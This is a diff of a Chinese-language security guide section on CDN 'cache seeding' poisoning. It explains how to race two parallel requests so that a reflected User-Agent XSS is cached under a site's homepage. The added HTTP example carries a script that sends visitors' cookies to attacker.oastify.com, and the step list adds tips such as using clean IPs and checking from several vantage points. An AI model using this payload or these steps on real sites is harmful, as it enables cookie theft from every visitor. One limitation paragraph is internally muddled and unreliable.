@@ -507,63 +507,46 @@ x=1
 
 ## 9.2 并行请求播种 (Cache Seeding)
 
+### 真实案例来源
+
+此技术**在实际 CDN/WAF 部署中被观测到**（HackTricks 源记录，具体厂商未公开命名），非实验室构造。
+
 ### 威胁模型
 
-缓存播种（Cache Seeding）利用 CDN 并发处理请求时的时序竞争，将**未缓存键控制的响应**错误地关联到**正常请求的缓存键**上。攻击需要三个前提：
+缓存播种利用 CDN 处理并发请求时的行为，将反射 XSS 的响应"播种"到正常用户的缓存键下。攻击需要三个前提：
 
-1. 存在一个**反射型 XSS 向量**（如 `User-Agent` 头反射到响应中），且该头**不参与缓存键**
-2. CDN 配置了**基于扩展名/路径的自动缓存规则**（如 `.js` 后缀默认缓存）
-3. 攻击者能**并发发送请求**，竞争 CDN 内部的缓存槽位分配
+1. 主页面将某个**请求头反射到可执行上下文**中（如 `User-Agent`），且该头**不参与缓存键**
+2. CDN 剥离了 `Cache-Control` 等缓存头，但存在**内部/源站缓存**；同时 CDN 对**静态扩展名**（如 `.js`）的请求应用**更弱的 WAF 检查**
+3. CDN 的缓存行为对外部**隐藏缓存头**（即响应中不显示 `X-Cache`、`Cf-Cache-Status` 等），投毒效果仅通过**多小时刷新周期**才可见
 
 ### 攻击机制
 
-CDN 在处理并发请求时，内部流程大致为：
-
-1. 收到请求 A → 检查缓存键 → 未命中 → 向源站发起回源请求 → 等待响应
-2. 收到请求 B → 检查缓存键 → 未命中 → 向源站发起回源请求 → 等待响应
-
-在高并发且 CDN 的缓存槽位锁机制不健壮时，可能出现以下竞态：
-
-- 请求 A（`GET /index.php/script.js`，带恶意 `User-Agent: "><script>stealCookies()</script>`）
-  - CDN 看到 `.js` 后缀 → 标记为"可缓存"
-  - 向源站发起回源
-- 请求 B（`GET /`，正常请求，无特殊 UA）
-  - CDN 看到 `/` → 同样是可缓存页面
-  - 几乎同时向源站发起回源
-
-**竞争点**：两个响应几乎同时从源站返回。如果 CDN 在处理时未正确隔离两个缓存槽位的写入操作，可能出现：
-
-> 请求 A（带恶意 UA → 源站返回含 XSS 的网页）的响应体被错误地写入请求 B（`/` 缓存键）的缓存槽
-
-结果：访问首页 `/` 的所有用户获得包含恶意反射 XSS 的响应——攻击者将带毒的响应"播种"到了与攻击请求不同的缓存键中。
-
-### PortSwigger 靶场示例
-
-PortSwigger Web Security Academy 有专门的缓存播种实验。典型场景：
-
-1. 目标站点将 `User-Agent` 反射到页面中且不参与缓存键
-2. CDN 配置自动缓存所有 `.js` 结尾的 URL
-3. 攻击路径：`/index.php/script.js` → 源站忽略 `/script.js` → 响应实际是 `/index.php` 内容
-4. 通过单包并发（Single-packet attack）同时发送：
-   - 请求 A：`GET /index.php/script.js` + 恶意 UA（含 XSS payload）
-   - 请求 B：`GET /`（普通 UA，模拟正常用户）
-5. 竞态导致请求 A 的毒化响应被写入请求 B 的缓存槽 → 首页被全局投毒
+关键洞察：CDN 对 `.js` 路径的请求**自动缓存**且 WAF 检查更宽松，但对主页面 `/` 的请求应用更严格的检查。通过并发发送两个请求，利用 CDN 路由竞态，使攻击者的恶意 UA 穿透 WAF：
 
 ```http
-# 请求 A — 向毒化源站，带恶意 UA（被反射到响应中）
+# 请求 1 — 走 .js 路径绕过严格 WAF（CDN 对此路径检查更弱）
 GET /index.php/script.js HTTP/1.1
-Host: cdn.target.com
-User-Agent: "><script>stealCookies()</script>
+Host: target.com
+User-Agent: Mo00ozilla/5.0</script><script>new Image().src='https://attacker.oastify.com?a='+document.cookie</script>"
 
-# 请求 B — 同时发送的清理请求，目标是首页缓存
+# 请求 2 — 同时发起，目标为首页
 GET / HTTP/1.1
-Host: cdn.target.com
-User-Agent: Mozilla/5.0 (normal browser)
+Host: target.com
+User-Agent: Mozilla/5.0 (legitimate)
 ```
 
-使用 Burp Suite 的 "Send group in parallel (single-packet attack)" 模式实现两者同时发送到 CDN。
+**竞争点**：请求 1 通过 `.js` 路径到达源站 → 源站忽略 `/script.js` 后缀 → 实际响应的是 `/index.php` 的 HTML 内容（含反射的恶意 UA → XSS）。由于 CDN 的并发处理，此带毒 HTML 响应被关联到了请求 2 的缓存键（`/` 的缓存桶）。结果：**首页被投毒**，所有后续访问 `/` 的用户获得包含 XSS payload 的页面。
 
-> **真实案例参考**：PortSwigger 研究团队在 [Practical Web Cache Poisoning](https://portswigger.net/research/practical-web-cache-poisoning) 中首次描述了该技术。虽未披露具体受影响企业，但该技术已在多个漏洞赏金项目中成功利用，目标包括使用了基于扩展名的激进缓存策略（如缓存所有 `.js`/`.css`/`.png` URL）的 CDN 部署。
+### 实战操作步骤
+
+1. **使用干净 IP** — 避免因先前 IP 的信誉降级而跳过缓存
+2. **在 Burp Repeater 中准备两个请求**，使用 "Send group in parallel"（单包模式）：
+   - 第一个请求：GET 同一源站下的 `.js` 资源路径，携带恶意 `User-Agent`
+   - 紧随其后：GET 主页 `/`
+3. **多视点验证** — 许多 CDN 隐藏缓存头（不显示 `X-Cache`），投毒效果可能仅数小时后才出现。使用多个出口 IP 错开时间窗口验证
+4. **CSP 注意** — 如果存在严格的 CSP，只有当 payload 在主页 HTML 上下文中执行且 CSP 允许内联执行或被绕过时才生效
+
+> **关键限制**：此技术依赖于受害者的 `User-Agent` 与攻击者投毒时使用的 UA **可能不匹配**——除非 CDN 将 `User-Agent` 纳入 `Vary` 头，否则同一缓存键下的所有 UA 都会命中。实际操作中，使用常见浏览器的 UA 前缀（`Mozilla/5.0`）作为 payload 前导字符，提高命中率。
 
 ## 9.3 Sitecore XAML 预认证投毒 → RCE
 
